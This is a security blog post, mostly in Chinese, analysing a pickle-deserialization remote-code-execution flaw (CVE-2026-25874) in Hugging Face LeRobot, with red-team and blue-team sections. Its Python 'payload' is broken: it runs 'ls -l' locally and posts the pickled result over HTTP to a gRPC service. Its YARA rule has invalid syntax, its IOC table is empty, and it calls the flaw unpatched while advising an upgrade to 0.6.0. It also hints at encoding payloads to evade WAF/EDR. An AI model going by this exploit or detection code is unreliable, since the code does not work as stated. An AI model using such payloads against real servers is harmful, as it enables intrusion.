---
layout: post
title:  "Critical Unpatched Flaw Leaves Hugging Face LeRobot Open to Unauthenticated RCE"
date:   2026-04-28 13:49:26 +0000
categories: [security]
severity: critical
---

# 🚨 解析 LeRobot 中的 CVE-2026-25874：遠程代碼執行漏洞
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS 分數: 9.3)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: Deserialization, Untrusted Data, gRPC

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: LeRobot 中的 async inference pipeline 存在一個不安全的反序列化漏洞，使用 `pickle.loads()` 對來自未經驗證的 gRPC 通道的數據進行反序列化，沒有進行適當的安全檢查。
* **攻擊流程圖解**:
  1. 攻擊者發送一個精心構造的 pickle payload 到 LeRobot 的 PolicyServer 或 robot client。
  2. LeRobot 使用 `pickle.loads()` 對 payload 進行反序列化。
  3. 反序列化的代碼執行，導致遠程代碼執行。
* **受影響元件**: LeRobot 版本 0.4.3

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要能夠到達 LeRobot 的 PolicyServer 網路端口。
* **Payload 建構邏輯**:

    ```
    
    python
    import pickle
    
    # 建構一個精心構造的 pickle payload
    payload = pickle.dumps(__import__('os').system('ls -l'))
    
    # 發送 payload 到 LeRobot 的 PolicyServer
    import requests
    response = requests.post('http://le-robot-policy-server:8080/SendPolicyInstructions', data=payload)
    
    ```
* **繞過技術**: 如果 LeRobot 部署了 WAF 或 EDR，攻擊者可能需要使用繞過技巧，例如使用不同的序列化格式或編碼 payload。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
|  |  |  |  |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule LeRobot_RCE {
      meta:
        description = "Detects LeRobot RCE vulnerability"
      strings:
        $pickle_magic = { 0x80 0x03 }
      condition:
        $pickle_magic at 0
    }
    
    ```
* **緩解措施**: 更新 LeRobot 到版本 0.6.0 或更高版本，或者使用安全的序列化格式，如 JSON 或 MessagePack。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Deserialization (反序列化)**: 將數據從序列化格式轉換回原始數據結構的過程。
* **Untrusted Data (不可信任數據)**: 來自未經驗證的源頭的數據，可能包含惡意代碼或數據。
* **gRPC (Google Remote Procedure Call)**: 一種高性能的 RPC 框架，使用 Protocol Buffers 進行序列化。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/04/critical-cve-2026-25874-leaves-hugging.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1204/)


